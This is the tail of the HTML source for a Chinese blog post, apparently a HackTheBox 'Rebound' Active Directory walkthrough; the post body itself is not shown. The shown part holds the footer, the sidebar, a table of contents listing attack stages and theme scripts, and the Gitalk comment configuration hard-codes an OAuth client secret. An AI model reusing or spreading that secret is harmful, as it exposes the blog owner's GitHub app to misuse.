+              alt="HTB Hercules"
+              class="lazyload"
+            /><a
+          href="/post/htb-hercules/"
+          aria-label="后一篇:HTB Hercules"
+          title="后一篇:HTB Hercules"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">HTB Hercules</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#smb服务">SMB服务</a></li>
+    <li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+    <li><a href="#kerberoasting">Kerberoasting</a></li>
+    <li><a href="#bloodhound信息收集">bloodhound信息收集</a></li>
+    <li><a href="#密码喷洒">密码喷洒</a></li>
+    <li><a href="#攻击面分析">攻击面分析</a></li>
+    <li><a href="#拿下winrm_svc">拿下winrm_svc！</a></li>
+    <li><a href="#后信息收集">后信息收集</a></li>
+    <li><a href="#remotepotato0跨会话中继">RemotePotato0跨会话中继</a></li>
+    <li><a href="#readgmsapassword">ReadGMSAPassword</a></li>
+    <li><a href="#再次信息收集">再次信息收集</a></li>
+    <li><a href="#约束委派-">约束委派 ×</a></li>
+    <li><a href="#基于资源的约束委派-">基于资源的约束委派 √</a></li>
+    <li><a href="#pth登录">PTH登录</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "HTB Rebound",
+          url: "http:\/\/localhost:1313\/post\/htb-rebound\/",
+          description: "HackTheBox篇ADCS系列之Rebound",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
